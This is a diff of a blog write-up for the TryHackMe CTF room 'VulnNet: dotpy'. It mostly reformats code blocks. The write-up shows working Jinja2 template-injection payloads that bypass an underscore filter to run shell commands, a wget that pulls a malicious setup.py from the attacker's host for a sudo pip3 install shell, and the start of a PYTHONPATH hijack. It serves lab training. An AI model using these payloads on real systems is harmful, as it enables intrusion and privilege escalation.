@@ -9,7 +9,7 @@ comments: true
 ---
 
 Title: VulnNet: dotpy<br>
-Description: <p>VulnNet Entertainment is back with their brand new website... and stronger?</p><br>
+Description: VulnNet Entertainment is back with their brand new website... and stronger?<br>
 This room is availiable at [TryHackMe VulnNet:Dotpy](https://tryhackme.com/room/vulnnetdotpy) Go to [TryHackMe](https://tryhackme.com/)
 
 ## Ports
@@ -34,19 +34,19 @@ Your request has been blocked.
 I think there are some filters in place, this may make it hard for us.
 First we are gonna try to get a urlparameter
 The following snippet will read the get parameter `c`
-```python
+```
 {{request|attr('args')|attr('get')('c')}}?c= 
 ```
 
 now that we can read c. 
 lets try running code on the machine.
-```text
+```
 {{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=
 ```
 
 All of this is to get the `_` from the get parameter `us` and use it in the code, bcause underscores are blocked. 
 this is the code when you dont have the underscore blocker
-```text
+```
 {{request|attr('application')|attr( "__globals__" ) |attr( "__getitem__" )( "__builtins__") |attr( "__getitem__")("__import__")('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?c=
 ```
 Way easier to read. :D
@@ -64,20 +64,19 @@ curl -c "SESSION=session-cookie" http://$IP:8080/{{request|attr('application')|a
 
 ## Changing user
 Lets do some enumeration, in the following output we see we can run `/usr/bin/pip3 install` as the user `system-adm`
-```bash
-sudo -l
+<pre class="command-line" data-prompt="web@vulnnet-dotpy $" data-output="4">
+<code class="language-bash">sudo -l
 # User web may run the following commands on vulnnet-dotpy:
-#    (system-adm) NOPASSWD: /usr/bin/pip3 install *
-```
+#    (system-adm) NOPASSWD: /usr/bin/pip3 install *</code></pre>
 
 Lets check [GTFOBins](https://gtfobins.github.io/) for an exploit, and there is [PIP Sudo GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo).
 
-```bash
-wget $YOUR_IP:8080/pip_setup.py; mv pip_setup.py setup.py
-sudo -u system-adm /usr/bin/pip3 install . 
-```
 
-And we are `system-adm` in our new shell. Lets get the user flag.
+<pre class="command-line" data-prompt="web@vulnnet-dotpy $" data-output="4">
+<code class="language-bash">wget $YOUR_IP:8080/pip_setup.py; mv pip_setup.py setup.py
+sudo -u system-adm /usr/bin/pip3 install . </code></pre>
+
+And we are now **system-adm** in our new shell. Lets get the user flag.
 <pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="4">
 <code class="language-bash">cat ~/user.txt
 # THM{********************************}</code></pre>
@@ -85,15 +84,16 @@ And we are `system-adm` in our new shell. Lets get the user flag.
 ## Privilege Escalation
 
 lets do some enumeration on the new user.
-```bash
-sudo -l
+
+<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="4">
+<code class="language-bash">sudo -l
 # Matching Defaults entries for system-adm on vulnnet-dotpy:
 #     env_reset, mail_badpass,
 #     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 # 
 # User system-adm may run the following commands on vulnnet-dotpy:
-#     (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
-```
+#     (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py</code></pre>
+
 
 we see that we can set an environment variable while executing python3. We can possibly do some **PYTHONPATH hijacking**. 
 there is a library imported `zipfile`, lets overwrite that! 
